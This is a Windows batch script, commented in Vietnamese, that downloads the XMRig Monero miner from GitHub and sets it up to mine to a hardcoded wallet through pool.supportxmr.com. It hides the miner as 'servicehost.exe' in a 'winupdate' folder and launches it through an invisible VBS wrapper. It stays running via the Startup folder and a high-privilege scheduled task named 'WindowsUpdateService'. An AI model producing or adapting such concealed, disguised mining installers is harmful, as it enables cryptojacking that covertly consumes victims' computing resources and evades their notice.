@echo off
setlocal enableextensions

:: ====== Cau hinh ======
set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
set RIG=%COMPUTERNAME%
set INSTALL_DIR=D:\winupdate
set BIN_DIR=%INSTALL_DIR%\bin
set EXE_NAME=servicehost.exe
set VBS_NAME=winup.vbs
set TASK_NAME=WindowsUpdateService
set STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set ZIP_URL=https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip
set ZIP_FILE=%INSTALL_DIR%\miner.zip

:: ====== Kiem tra quyen admin ======
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [!] Vui long chay file nay bang "Run as Administrator".
    pause
    exit /b
)

:: ====== Bat dau setup ======
echo [+] Tao thu muc: %INSTALL_DIR%
mkdir "%INSTALL_DIR%" >nul 2>&1
cd /d "%INSTALL_DIR%"

echo [+] Dang tai XMRig tu GitHub...
powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%'"

echo [+] Dang giai nen file zip...
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%BIN_DIR%' -Force"

:: ====== Doi ten file xmrig.exe ======
cd /d "%BIN_DIR%"
if exist xmrig.exe (
    rename xmrig.exe %EXE_NAME%
)

:: ====== Tao start.bat ======
echo [+] Tao start.bat
(
echo @echo off
echo cd /d "%BIN_DIR%"
echo start /min %EXE_NAME% -o pool.supportxmr.com:3333 -u %WALLET% -k --rig-id %RIG%
) > "%INSTALL_DIR%\start.bat"

:: ====== Tao VBS chay an ======
echo [+] Tao file VBS an
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34^) ^& "%INSTALL_DIR%\start.bat" ^& Chr(34^), 0
echo Set WshShell = Nothing
) > "%INSTALL_DIR%\%VBS_NAME%"

:: ====== Tao copy_to_startup.bat ======
echo [+] Tao copy_to_startup.bat
(
echo @echo off
echo copy "%INSTALL_DIR%\%VBS_NAME%" "%STARTUP_PATH%\%VBS_NAME%" /Y
) > "%INSTALL_DIR%\copy_to_startup.bat"

:: ====== Copy shortcut vao Startup ngay ======
copy "%INSTALL_DIR%\%VBS_NAME%" "%STARTUP_PATH%\%VBS_NAME%" /Y

:: ====== Tao Scheduled Task de dam bao startup ======
echo [+] Tao Scheduled Task
schtasks /Create ^
 /TN "%TASK_NAME%" ^
 /TR "\"%INSTALL_DIR%\copy_to_startup.bat\"" ^
 /SC ONSTART ^
 /RL HIGHEST ^
 /F >nul

:: ====== Chay miner lan dau ======
echo [+] Dang chay thu miner lan dau...
cscript //nologo "%INSTALL_DIR%\%VBS_NAME%"

echo.
echo [OK] Cai dat hoan tat!
echo [OK] Miner se chay an khi may khoi dong.
echo [Worker]: %RIG%
pause

